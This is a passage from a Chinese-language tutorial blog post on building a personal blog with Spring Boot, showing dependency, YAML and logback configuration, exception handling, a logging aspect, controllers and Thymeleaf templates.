class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atlassian.commonmark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commonmark-ext-heading-anchor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atlassian.commonmark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commonmark-ext-gfm-tables<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Application-yml配置文件"><a href="#Application-yml配置文件" class="headerlink" title="Application.yml配置文件"></a>Application.yml配置文件</h3><p>thymeleaf模板配置</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">thymeleaf:</span> </span><br><span class="line">    <span class="attr">mode:</span> <span class="string">HTML</span></span><br></pre></td></tr></table></figure><p>数据库相关连接配置</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">datasource:</span></span><br><span class="line">  <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/blog?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">password:</span> <span class="number">123456789</span></span><br></pre></td></tr></table></figure><p>JPA的连接配置</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jpa:</span></span><br><span class="line"><span class="attr">hibernate:</span></span><br><span class="line">  <span class="attr">ddl-auto:</span> <span class="string">update</span></span><br><span class="line"><span class="attr">show-sql:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>日志配置</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">root:</span> <span class="string">info</span></span><br><span class="line">    <span class="attr">com.cxkj:</span> <span class="string">debug</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">log/blog.log</span></span><br></pre></td></tr></table></figure><p>日志的细节操作(logback-spring.xml)</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--包含Spring boot对logback日志的默认配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">resource</span>=<span class="string">&quot;org/springframework/boot/logging/logback/defaults.xml&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;LOG_FILE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;LOG_FILE:-$&#123;LOG_PATH:-$&#123;LOG_TEMP:-$&#123;java.io.tmpdir:-/tmp&#125;&#125;&#125;/spring.log&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">resource</span>=<span class="string">&quot;org/springframework/boot/logging/logback/console-appender.xml&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--重写了Spring Boot框架 org/springframework/boot/logging/logback/file-appender.xml 配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;TIME_FILE&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>$&#123;FILE_LOG_PATTERN&#125;<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;LOG_FILE&#125;<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;LOG_FILE&#125;.%d&#123;yyyy-MM-dd&#125;.%i<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--保留历史日志一个月的时间--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            Spring Boot默认情况下，日志文件10M时，会切分日志文件,这样设置日志文件会在100M时切分日志</span></span><br><span class="line"><span class="comment">            --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>10MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;TIME_FILE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            1、继承Spring boot logback设置（可以在appliaction.yml或者application.properties设置logging.*属性）</span></span><br><span class="line"><span class="comment">            2、重写了默认配置，设置日志文件大小在100MB时，按日期切分日志，切分后目录：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                blog.2017-08-01.0   80MB</span></span><br><span class="line"><span class="comment">                blog.2017-08-01.1   10MB</span></span><br><span class="line"><span class="comment">                blog.2017-08-02.0   56MB</span></span><br><span class="line"><span class="comment">                blog.2017-08-03.0   53MB</span></span><br><span class="line"><span class="comment">                ......</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br></pre></td></tr></table></figure><p>公共环境(开发环境指定为dev)</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">thymeleaf:</span></span><br><span class="line">    <span class="attr">mode:</span> <span class="string">HTML</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure><p>开发环境</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/blog?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456789</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">hibernate:</span></span><br><span class="line">      <span class="attr">ddl-auto:</span> <span class="string">update</span></span><br><span class="line">    <span class="attr">show-sql:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">root:</span> <span class="string">info</span></span><br><span class="line">    <span class="attr">com.cxkj:</span> <span class="string">debug</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">log/blog-dev.log</span></span><br></pre></td></tr></table></figure><p>生产环境</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/blog?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456789</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">hibernate:</span></span><br><span class="line">      <span class="attr">ddl-auto:</span> <span class="string">none</span></span><br><span class="line">    <span class="attr">show-sql:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">root:</span> <span class="string">warn</span></span><br><span class="line">    <span class="attr">com.cxkj:</span> <span class="string">info</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">log/blog-pro.log</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">808</span></span><br></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>IndexController.java Web控制器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String blog = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (blog == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span>  <span class="keyword">new</span> NotFoundException(<span class="string">&quot;博客不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ControllerExceptionHandler.java BeBug拦截器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.AnnotationUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ControllerAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ExceptionHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ControllerExceptionHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(<span class="keyword">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler(Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">exceptionHandler</span><span class="params">(HttpServletRequest request,Exception e)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Requst URL : &#123;&#125;,Exception : &#123;&#125;&quot;</span>, request.getRequestURI(),e);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (AnnotationUtils.findAnnotation(e.getClass(), ResponseStatus.class) != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">        ModelAndView mv = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        mv.addObject(<span class="string">&quot;url&quot;</span>,request.getRequestURI());</span><br><span class="line">        mv.addObject(<span class="string">&quot;exception&quot;</span>,e);</span><br><span class="line">        mv.setViewName(<span class="string">&quot;error/error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>error.html BeBug页面</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>BeBug<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>BeBug<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;&#x27;<span class="symbol">&amp;lt;</span>!--&#x27;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;&#x27;Failed Request URL : &#x27; + $&#123;url&#125;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;&#x27;Exception message : &#x27; + $&#123;exception.message&#125;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">th:each</span>=<span class="string">&quot;st : $&#123;exception.stackTrace&#125;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:utext</span>=<span class="string">&quot;$&#123;st&#125;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;&#x27;--<span class="symbol">&amp;gt;</span>&#x27;&quot;</span> <span class="attr">th:remove</span>=<span class="string">&quot;tag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>NotFoundException.java 异常类，业务相关（如果没有页面报错404）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseStatus;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ResponseStatus(HttpStatus.NOT_FOUND)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NotFoundException</span> <span class="keyword">extends</span> <span class="title">RuntimeException</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NotFoundException</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NotFoundException</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NotFoundException</span><span class="params">(String message, Throwable cause)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(message, cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="日志处理"><a href="#日志处理" class="headerlink" title="日志处理"></a>日志处理</h3><p>LogAspect.java 接口记录日志AOP类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.aspect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.JoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/4.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogAspect</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(<span class="keyword">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.cxkj.blog.web.*.*(..))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;log()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doBefore</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">        ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">        HttpServletRequest request = attributes.getRequest();</span><br><span class="line">        String url = request.getRequestURL().toString();</span><br><span class="line">        String ip = request.getRemoteAddr();</span><br><span class="line">        String classMethod = joinPoint.getSignature().getDeclaringTypeName() + <span class="string">&quot;.&quot;</span> + joinPoint.getSignature().getName();</span><br><span class="line">        Object[] args = joinPoint.getArgs();</span><br><span class="line">        RequestLog requestLog = <span class="keyword">new</span> RequestLog(url, ip, classMethod, args);</span><br><span class="line">        logger.info(<span class="string">&quot;Request : &#123;&#125;&quot;</span>, requestLog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After(&quot;log()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAfter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//logger.info(&quot;------ doAfter ------&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterReturning(returning = &quot;result&quot;, pointcut = &quot;log()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAfterReturning</span><span class="params">(Object result)</span> </span>&#123;</span><br><span class="line">        logger.info(<span class="string">&quot;Result : &#123;&#125;&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestLog</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String url;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String ip;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String classMethod;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Object[] args;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">RequestLog</span><span class="params">(String url, String ip, String classMethod, Object[] args)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.url = url;</span><br><span class="line">            <span class="keyword">this</span>.ip = ip;</span><br><span class="line">            <span class="keyword">this</span>.classMethod = classMethod;</span><br><span class="line">            <span class="keyword">this</span>.args = args;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;url=&#x27;&quot;</span> + url + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                    <span class="string">&quot;, ip=&#x27;&quot;</span> + ip + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                    <span class="string">&quot;, classMethod=&#x27;&quot;</span> + classMethod + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                    <span class="string">&quot;, args=&quot;</span> + Arrays.toString(args) +</span><br><span class="line">                    <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IndexController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;/&#123;name&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(<span class="meta">@PathVariable</span> Integer id,<span class="meta">@PathVariable</span> String name)</span></span>&#123;</span><br><span class="line">            <span class="comment">/*String blog = null;</span></span><br><span class="line"><span class="comment">            if (blog == null)&#123;</span></span><br><span class="line"><span class="comment">                throw  new NotFoundException(&quot;博客不存在&quot;);</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">        System.out.println(<span class="string">&quot;------ Index ------&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="页面处理"><a href="#页面处理" class="headerlink" title="页面处理"></a>页面处理</h3><p>IndexController.java Web控制器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="comment">/*String blog = null;</span></span><br><span class="line"><span class="comment">            if (blog == null)&#123;</span></span><br><span class="line"><span class="comment">                throw  new NotFoundException(&quot;博客不存在&quot;);</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态页面 定义Thymeleaf片段</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span> <span class="attr">th:fragment</span>=<span class="string">&quot;head(title)&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> 